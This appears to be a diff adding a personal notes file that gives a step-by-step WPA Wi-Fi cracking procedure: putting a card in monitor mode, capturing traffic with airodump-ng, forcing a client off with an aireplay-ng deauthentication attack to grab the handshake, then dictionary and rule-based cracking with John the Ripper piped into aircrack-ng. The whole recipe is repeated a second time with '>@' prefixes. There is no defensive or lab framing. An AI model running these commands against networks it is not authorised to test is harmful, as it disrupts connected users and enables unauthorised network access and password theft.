@@ -1,0 +1,71 @@
+1. Put the wireless card in Monitor mode.
+
+2. Access point verification.
+$ sudo airodump-ng wlan0
+>>> note the BSSID: MAC of the access point.
+>>> note the ESSID: name of the access point.
+
+3. Packets recording with airodump-ng.
+$ sudo airodump-ng --bssid <BSSID> --channel <ch> -w wpa wlan0
+>>> Wait for the WPA handshake.
+
+4. Forced deconnexion.
+Choose one conencted equipmeent.
+$ sudo aireplay-ng --deauth 5 -a <BSSID> -c <TARGET MAC> wlan0
+>>> A WPA handshake should appear into aireplay-ng.
+
+5. Stop the airodump-ng recorder (see 3.).
+Use Ctrl-C.
+
+6. Test with aircrack and the John's password.lst file.
+$ sudo sudo aircrack-ng ~/wpa-01.cap -w /usr/share/john/password.lst
+
+7. Test with John and aircrack-ng
+John generates a list of password and gives it to aircrack-ng for treatment.
+$ sudo john --stdout -w=/usr/share/john/password.lst | aircrack-ng -b <BSSID> wpa-01.cap -w -
+
+8. Test with John, aircrack-ng and a frech dictionary.
+$ sudo john --stdout -w=/usr/share/john/french.lst | aircrack-ng -b <BSSID> ~/wpa-01.cap -w -
+
+9. Test with John, aircrack-ng a french dictionary and some basic rules (uppercase, add some chars...).
+See default rules into /usr/share/john/john.conf
+$ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b <BSSID> wpa-01.cap -w -
+>@
+>@########################################################################################################
+>@
+>@1. Put the wireless card in Monitor mode.
+>@
+>@2. Access point verification.
+>@$ sudo airodump-ng wlan0
+>@>>> note the BSSID: MAC of the access point.
+>@>>> note the ESSID: name of the access point.
+>@
+>@3. Packets recording with airodump-ng.
+>@$ sudo airodump-ng --bssid <BSSID> --channel <ch> -w wpa wlan0
+>@>>> Wait for the WPA handshake.
+>@
+>@4. Forced deconnexion.
+>@Choose one conencted equipmeent.
+>@$ sudo aireplay-ng --deauth 5 -a <BSSID> -c <TARGET MAC> wlan0
+>@>>> A WPA handshake should appear into aireplay-ng.
+>@
+>@5. Stop the airodump-ng recorder (see 3.).
+>@Use Ctrl-C.
+>@
+>@6. Test with aircrack and the John's password.lst file.
+>@$ sudo sudo aircrack-ng ~/wpa-01.cap -w /usr/share/john/password.lst
+>@
+>@7. Test with John and aircrack-ng
+>@John generates a list of password and gives it to aircrack-ng for treatment.
+>@$ sudo john --stdout -w=/usr/share/john/password.lst | aircrack-ng -b <BSSID> wpa-01.cap -w -
+>@
+>@8. Test with John, aircrack-ng and a frech dictionary.
+>@$ sudo john --stdout -w=/usr/share/john/french.lst | aircrack-ng -b <BSSID> ~/wpa-01.cap -w -
+>@
+>@9. Test with John, aircrack-ng a french dictionary and some basic rules (uppercase, add some chars...).
+>@See default rules into /usr/share/john/john.conf
+>@$ sudo john --stdout -w=/usr/share/john/french.lst --rules | aircrack-ng -b <BSSID> wpa-01.cap -w -
+>@
+>@########################################################################################################
+>@
+
